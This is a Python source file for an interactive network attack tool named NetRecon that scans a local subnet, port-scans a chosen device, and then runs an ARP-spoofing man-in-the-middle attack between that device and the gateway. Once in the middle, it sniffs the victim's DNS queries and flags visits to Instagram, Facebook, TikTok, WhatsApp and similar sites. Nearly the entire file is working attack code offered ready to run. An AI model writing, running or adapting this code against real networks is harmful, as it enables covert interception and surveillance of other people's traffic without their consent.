import ipaddress
import os
import platform
import socket
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from scapy.all import ARP, DNS, DNSQR, IP, UDP, Ether, send, sniff, srp

# =================================================================
#                     HELPER FUNCTIONS
# =================================================================


def check_root():
  if os.geteuid() != 0:
    print(
        "[-] Error: NetRecon must be run with root privileges (sudo python3"
        " netrecon.py)."
    )
    sys.exit(1)


def get_local_ip_and_subnet():
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    parts = local_ip.split(".")
    subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    return local_ip, subnet
  except Exception:
    return "192.168.1.50", "192.168.1.0/24"


def get_gateway_ip(local_ip):
  parts = local_ip.split(".")
  return f"{parts[0]}.{parts[1]}.{parts[2]}.1"


def get_mac(ip):
  try:
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=1, verbose=False
    )
    for _, rcv in ans:
      return rcv[Ether].src
  except Exception:
    return None


def get_device_vendor(mac):
  if not mac or mac == "N/A":
    return "Unknown Vendor"
  try:
    from scapy.data import MANUFDB

    oui = ":".join(mac.split(":")[:3]).upper()
    return MANUFDB._manufdb.get(oui, "Generic / Unknown Vendor")
  except Exception:
    return "Unknown Vendor"


def get_hostname(ip):
  try:
    hostname, _, _ = socket.gethostbyaddr(ip)
    return hostname
  except Exception:
    return "Unknown Hostname"


def enable_ip_forwarding():
  try:
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
      f.write("1")
  except Exception:
    pass


def disable_ip_forwarding():
  try:
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
      f.write("0")
  except Exception:
    pass


# =================================================================
#                     ARP SPOOFING (MITM) ENGINE
# =================================================================


def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, stop_event):
  print(
      f"[*] ARP Spoofing active: Target ({target_ip}) <---> Gateway"
      f" ({gateway_ip})"
  )
  while not stop_event.is_set():
    send(
        ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip),
        verbose=False,
    )
    send(
        ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
        verbose=False,
    )
    time.sleep(2)


def restore_network(target_ip, target_mac, gateway_ip, gateway_mac):
  print("\n[*] Restoring network ARP tables...")
  send(
      ARP(
          op=2,
          pdst=target_ip,
          hwdst="ff:ff:ff:ff:ff:ff",
          psrc=gateway_ip,
          hwsrc=gateway_mac,
      ),
      count=3,
      verbose=False,
  )
  send(
      ARP(
          op=2,
          pdst=gateway_ip,
          hwdst="ff:ff:ff:ff:ff:ff",
          psrc=target_ip,
          hwsrc=target_mac,
      ),
      count=3,
      verbose=False,
  )
  print("[+] Network restored.")


# =================================================================
#                    FAST HOST & PORT SCANNER
# =================================================================


def ping_host(ip):
  param = "-n" if platform.system().lower() == "windows" else "-c"
  command = ["ping", param, "1", "-W", "1", str(ip)]
  try:
    if (
        subprocess.run(
            command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        ).returncode
        == 0
    ):
      return str(ip)
  except Exception:
    pass
  return None


def scan_network(subnet):
  print(
      "\n================================================================="
  )
  print("              FAST HOST DISCOVERY (Lightning Scan)               ")
  print(
      "================================================================="
  )
  try:
    net = ipaddress.ip_network(subnet, strict=False)
  except ValueError as e:
    print(f"[-] Invalid subnet: {e}")
    return []

  active_hosts = []
  print(f"[*] Scanning {subnet} for active devices (Please wait)...")

  with ThreadPoolExecutor(max_workers=100) as executor:
    results = executor.map(ping_host, net.hosts())
    for ip in results:
      if ip:
        print(f"[+] Active Host Discovered: {ip}")
        active_hosts.append(ip)

  print(f"==================================================")
  print(f"[+] Scan Completed. Total Active Hosts: {len(active_hosts)}")
  return active_hosts


def scan_ports_for_target(target_ip):
  print(
      "\n------------------------------------------------------------------"
  )
  print(f"[*] Quick Port Scan on Target: {target_ip}")
  common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 3306, 8080]
  open_ports = []

  def check_port(port):
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(0.4)
      result = s.connect_ex((target_ip, port))
      s.close()
      if result == 0:
        return port
    except Exception:
      pass
    return None

  with ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(check_port, common_ports)
    for p in results:
      if p:
        print(f"    [+] Open Port Discovered: {p}")
        open_ports.append(p)

  if not open_ports:
    print("    [-] No common open ports found or firewall blocking.")
  print(
      "------------------------------------------------------------------"
  )


# =================================================================
#                     DNS PACKET HANDLER
# =================================================================


def dns_callback(packet):
  if packet.haslayer(DNS) and packet.haslayer(DNSQR):
    qname = packet[DNSQR].qname.decode("utf-8", errors="ignore").lower()
    src_ip = packet[IP].src if packet.haslayer(IP) else "Unknown"

    social_keywords = [
        "instagram",
        "cdninstagram",
        "fbcdn",
        "facebook",
        "twitter",
        "tiktok",
        "whatsapp",
    ]
    is_social = any(keyword in qname for keyword in social_keywords)

    if is_social:
      print(
          f"\033[91m[SOCIAL MEDIA ALERT] Source: {src_ip} ---> Requested"
          f" Domain: {qname}\033[0m"
      )
    else:
      print(f"[DNS QUERY] Source: {src_ip} ---> Requested Domain: {qname}")


# =================================================================
#                            MAIN FLOW
# =================================================================


def main():
  check_root()

  print(
      "================================================================="
  )
  print("                    NetRecon v4.1 (Optimized)                    ")
  print("     Ultimate Network Recon, Brand Sniffer & Social Monitor      ")
  print(
      "================================================================="
  )

  interface = input(
      "[*] Enter interface name to use (e.g., wlan0, eth0) or press enter for"
      " default: "
  ).strip()
  if not interface:
    interface = None

  auto_ip, auto_subnet = get_local_ip_and_subnet()

  # İstediğin subnet seçim ekranı tekrar eklendi!
  print("\n------------------------------------------------------------------")
  print("SUBNET SELECTION:")
  print(f"1. Auto-detect (Recommended: {auto_subnet})")
  print("2. Enter manual subnet (e.g., 192.168.2.0/24)")
  print("------------------------------------------------------------------")

  subnet_choice = input("[*] Enter choice (1 or 2): ").strip()
  if subnet_choice == "2":
    subnet_input = input(
        "[*] Enter target subnet (e.g., 192.168.1.0/24): "
    ).strip()
  else:
    subnet_input = auto_subnet
    print(f"[*] Auto-selected subnet: {subnet_input}")

  while True:
    active_hosts = scan_network(subnet_input)
    if not active_hosts:
      print("[-] No active hosts found on the network.")
      break

    print("\n------------------------------------------------------------------")
    print("SELECT TARGET DEVICE FROM DISCOVERED HOSTS:")
    print("------------------------------------------------------------------")

    gateway_ip = get_gateway_ip(auto_ip)

    for idx, host in enumerate(active_hosts):
      h_mac = get_mac(host)
      h_vendor = get_device_vendor(h_mac)
      h_name = get_hostname(host)
      gw_tag = " (GATEWAY)" if host == gateway_ip else ""
      print(
          f"    {idx}. IP: {host}{gw_tag} | MAC: {h_mac} | Hostname: {h_name} |"
          f" Vendor: {h_vendor}"
      )

    try:
      choice = int(
          input("\n[*] Enter the number of the target device to inspect: ")
      )
      target_ip = active_hosts[choice]
    except (ValueError, IndexError):
      print("[-] Invalid selection. Returning to menu...")
      continue

    while True:
      target_mac = get_mac(target_ip)
      target_vendor = get_device_vendor(target_mac)
      target_hostname = get_hostname(target_ip)

      print(
          "\n================================================================="
      )
      print(f"TARGET SELECTED: {target_ip}")
      print(
          f"MAC: {target_mac} | Hostname: {target_hostname} | Vendor:"
          f" {target_vendor}"
      )
      print(
          "================================================================="
      )
      print("1. Run Quick Port Scan")
      print("2. Start DNS Sniffing & MITM (Target Specific / ARP Spoofing)")
      print("3. Start Universal DNS Sniffing (All Network / MITM)")
      print("4. Rescan Network / Change Target")
      print("------------------------------------------------------------------")

      action = input("[*] Choose an action (1-4): ").strip()

      if action == "1":
        scan_ports_for_target(target_ip)
        input("\n[*] Press Enter to return to target menu...")

      elif action == "2" or action == "3":
        if action == "3":
          print("[*] Universal DNS Sniffing mode active...")

        gateway_mac = get_mac(gateway_ip)
        if not target_mac or not gateway_mac:
          print("[-] Error: Could not resolve MAC addresses. Try again.")
          continue

        print(
            "\n------------------------------------------------------------------"
        )
        print("SNIFFING TERMINATION CRITERIA:")
        print("1. Stop after specific timeout (e.g., 30 seconds)")
        print("2. Stop after specific DNS query count (e.g., 10 packets)")
        print("3. Unlimited (Run until manual interruption - Ctrl+C)")
        print(
            "------------------------------------------------------------------"
        )
        limit_choice = input("[*] Enter choice (1, 2, or 3): ").strip()

        sniff_timeout = None
        sniff_count = 0

        if limit_choice == "1":
          try:
            sniff_timeout = int(
                input("[*] Enter timeout in seconds (e.g., 20): ").strip()
            )
          except ValueError:
            sniff_timeout = 30
        elif limit_choice == "2":
          try:
            sniff_count = int(
                input(
                    "[*] Enter target DNS query packet count limit (e.g., 10):"
                    " "
                ).strip()
            )
          except ValueError:
            sniff_count = 10

        enable_ip_forwarding()

        stop_event = threading.Event()
        spoof_thread = threading.Thread(
            target=arp_spoof,
            args=(target_ip, target_mac, gateway_ip, gateway_mac, stop_event),
        )
        spoof_thread.daemon = True
        spoof_thread.start()

        print(
            "\n================================================================="
        )
        print(
            f"[*] Listening on interface: {interface if interface else 'default'}"
        )
        print(
            "[*] MITM DNS SNIFFING ACTIVE (Social Media & Traffic Interception)"
        )
        print(
            "================================================================="
        )

        try:
          sniff(
              iface=interface,
              filter="udp port 53",
              prn=dns_callback,
              store=0,
              timeout=sniff_timeout,
              count=sniff_count,
          )
          print("\n[+] Sniffing criteria reached. Restoring network...")
        except KeyboardInterrupt:
          print("\n[*] Stopping sniffer by user...")

        stop_event.set()
        spoof_thread.join()
        restore_network(target_ip, target_mac, gateway_ip, gateway_mac)
        disable_ip_forwarding()
        print("[+] Network restored.")
        input("\n[*] Press Enter to return to target menu...")

      elif action == "4":
        break
      else:
        print("[-] Invalid option. Please choose between 1-4.")


if __name__ == "__main__":
  try:
    main()
  except KeyboardInterrupt:
    print("\n[+] Program closed completely by user.")
    sys.exit(0)
